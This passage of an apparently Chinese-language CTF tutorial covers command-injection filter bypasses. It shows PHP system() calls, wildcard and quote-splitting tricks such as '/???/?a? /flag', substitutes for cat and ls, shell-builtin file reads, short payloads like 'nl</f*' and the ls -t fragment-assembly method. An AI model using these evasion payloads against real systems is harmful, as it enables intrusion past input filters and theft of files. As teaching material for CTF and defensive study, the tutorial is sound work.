call_user_func("system", "cat /flag");
create_function('', 'system("cat /flag");')();  // PHP 7.1 及之前
```

### 1.7.3 通配符绕过

| 通配符   | 含义                  | 示例                              |
| -------- | --------------------- | --------------------------------- |
| `*`      | 0 或多个任意字符      | `/???/??? /f*` → `/bin/cat /flag` |
| `?`      | **恰好 1 个**任意字符 | `/???/?a? /f???`                  |
| `[abc]`  | 括号内任一字符        | `[cC][aA][tT]`                    |
| `[a-z]`  | 范围内的字符          | `[a-z]at /flag`                   |
| `[^abc]` | 不在括号内的字符      | `[^x]at /flag`                    |

**实战利用：**

```bash
# 不确定 cat 路径
/???/?a? /flag           # /bin/cat /flag
/???/?[a]? /flag         # 同上

# 不确定 flag 文件名
cat /f*                  # 任意以 f 开头的文件
cat /f???                # f + 恰好 3 个字符
cat /*lag*               # 任意位置包含 lag 的文件
cat /????/f*             # 遍历短目录下的 f 开头文件

# 组合技：通配符 + 引号
/???/?''a''? /f''lag
/???/?a$@t /fla$1g
```

### 1.7.4 常用命令的替代

#### 1.7.4.1 读文件（cat 被过滤）

| 命令      | 用法                 | 特点                 |
| --------- | -------------------- | -------------------- |
| `tac`     | `tac /flag`          | 倒序输出（行序颠倒） |
| `more`    | `more /flag`         | 分页显示             |
| `less`    | `less /flag`         | 分页显示（可上下翻） |
| `head`    | `head -n 100 /flag`  | 前 N 行              |
| `tail`    | `tail -n 100 /flag`  | 后 N 行              |
| `nl`      | `nl /flag`           | 带行号显示           |
| `od`      | `od -c /flag`        | 八进制/ASCII         |
| `sort`    | `sort /flag`         | 排序后输出           |
| `uniq`    | `uniq /flag`         | 去重输出             |
| `rev`     | `rev /flag`          | 反转字符             |
| `strings` | `strings /flag`      | 提取可打印字符串     |
| `paste`   | `paste /flag`        | 按列合并             |
| `dd`      | `dd if=/flag`        | 磁盘级读取           |
| `cut`     | `cut -c 1-500 /flag` | 按列截取             |

**Shell 内置方式：**

```bash
while read line; do echo $line; done < /flag       # 逐行读
echo $(</flag)                                      # 重定向 + 命令替换
read line < /flag; echo $line                       # 读第一行
exec 3</flag; cat <&3                               # 文件描述符重定向
```

#### 1.7.4.2 列目录（ls 被过滤）

```bash
dir                     # ls 简化版
echo *                  # 通配符展开
printf "%s\n" *         # 换行显示
find .                  # 最强大（列出所有文件，包含子目录）
stat *                  # 显示文件详细信息
tree                    # 树形目录
```

### 1.7.5 长度限制

**最短可用 payload：**

```bash
nl /f*         # 6 字符：读 flag
nl</f*         # 6 字符：省略空格；要求 /f* 只展开到一个目标
```

**经典技巧：`>` 写入 + `ls -t` + `sh`**

每次只能执行几个字符时，可以把命令片段编码成**当前可写目录中的文件名**，再利用目录排序结果组装脚本。不过具体写法强依赖 Shell、长度上限、可用字符、文件名创建顺序和 `ls` 输出格式，不能把下面这种写法当成通用 Payload：

```bash
# 先在隔离目录中创建经过转义的片段文件名
# 再把排序结果写入脚本，并在执行前检查内容
ls -t > _
sed -n '1,20p' _
# 确认 _ 的内容确实构成预期命令后，才执行：sh _
```

`> /flag` 是对绝对路径 `/flag` 做输出重定向，可能直接截断文件，并不会创建一个名为 `/flag` 的片段文件；因此原理演示必须使用当前可写目录中的安全文件名。

**利用 here-string：**

```bash
$0<<<cat\ /f*    # Bash here-string；仅当 $0 确实指向可执行 Shell 时才可能成立
```
